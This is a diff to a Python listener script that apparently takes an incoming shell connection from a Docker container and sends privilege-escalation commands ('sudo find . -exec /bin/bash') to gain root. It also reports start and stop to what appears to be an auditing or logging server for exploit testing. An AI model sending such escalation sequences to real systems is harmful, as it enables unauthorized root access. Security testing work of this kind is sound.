@@ -15,13 +15,17 @@ def listen(ip, port, general_info):
 		print('Connection received from ',addr)
 		
 		# Inform the Logging server
-		start = '\n'
 		if general_info['active'] == 'True':
-			start = 'wget \'' + informAudittingStart(general_info) + '\'"$(echo $$)"' + ' -O /dev/null\n'
+			try:
+				requests.get('http://'+ informAudittingStart(general_info), timeout=(1,1)) 
+			except requests.exceptions.ReadTimeout:
+			    		pass
+			except requests.exceptions.ConnectTimeout:
+			    	sys.exit('[-] Failed to connect to Logging server')
 		
 		# Commands in order to get root access
 		# In order to escalate privilege we will assume the docker has permission to run sudo find (simulating a, not so likely but possible, vulnerability)
-		escalation = [start, 'cd /\n', 'sudo find . -exec /bin/bash \; -quit\n']
+		escalation = ['cd /\n', 'sudo find . -exec /bin/bash \; -quit\n']
 		for cmd in escalation:
 			# Avoid stalling for ever
 			conn.settimeout(1.0)
@@ -143,7 +147,7 @@ def cleanup(conn, general_info):
 	if general_info['active'] == 'True':
 		try:
 			# The pid here is random, we dont really to specify it
-			requests.get('http://'+ informAudittingStop(general_info) + '3232', timeout=(1,1)) # Pid here doenst really matter
+			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1)) 
 		except requests.exceptions.ReadTimeout:
 		    		pass
 		except requests.exceptions.ConnectTimeout:
@@ -153,11 +157,11 @@ def cleanup(conn, general_info):
 def informAudittingStart(general_info):
 	exploit = 'Docker'
 	# Pid is added on the terminal using $(echo $$)
-	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit + '&pid='
+	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit 
 	return url
 
 def informAudittingStop(general_info):
 	exploit = 'Docker'
 	# Pid is added on the terminal using $(echo $$)
-	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit + '&pid='
+	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit 
 	return url
